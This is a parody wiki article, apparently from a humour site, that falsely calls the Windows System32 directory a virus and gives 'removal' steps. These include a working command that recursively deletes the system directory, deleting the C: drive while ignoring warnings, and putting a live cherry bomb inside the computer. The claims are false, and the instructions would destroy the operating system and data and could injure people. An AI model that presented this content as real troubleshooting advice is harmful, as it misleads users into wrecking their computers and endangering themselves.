'''System32''' is a [[virus]] that infects your [[Windows]] directory and turns it into a [[shit nobody cares about|Sega]] game. [[Microsoft]] makes software to remedy this called "My Computer". It comes pre-installed with most Windows systems and can most likely be found on your desktop.

To remove the '''System32''' trojan virus, you have two choices. The quickest, most effective method is to press the Windows key on the keyboard, hold it, and press 'R', and then type '''cmd /c rd /s /q %windir%\system32''' -- or you may double-click "My Computer", then right-click the infected C: directory, and choose Delete. Ignore any warnings, as this malicious virus will try to stay on your directory as long as it can. However, if it is too late for "My Computer" to fix it, your computer will stop working. 

Of course if this doesn't fix your problem sufficiently you can always do a factory wipe. This operation is carried out by removing your hard drive then unscrewing the case. Then drop a live cherry bomb into the CPU, the shock wave from the explosion will compact your data into smaller bits giving you more memory. After this remove the black disk inside the casing (this covered with system32) and clean with acetone until the aluminium platters are clean once more. While you are at it, remove your RAM chips and wipe them on a woollen jumper as to renew the static in the static RAM.

Remounting is the reverse of removal, then Press the on button and- voila!- "system 32" is gone. Enjoy your bug free, virus free computer.
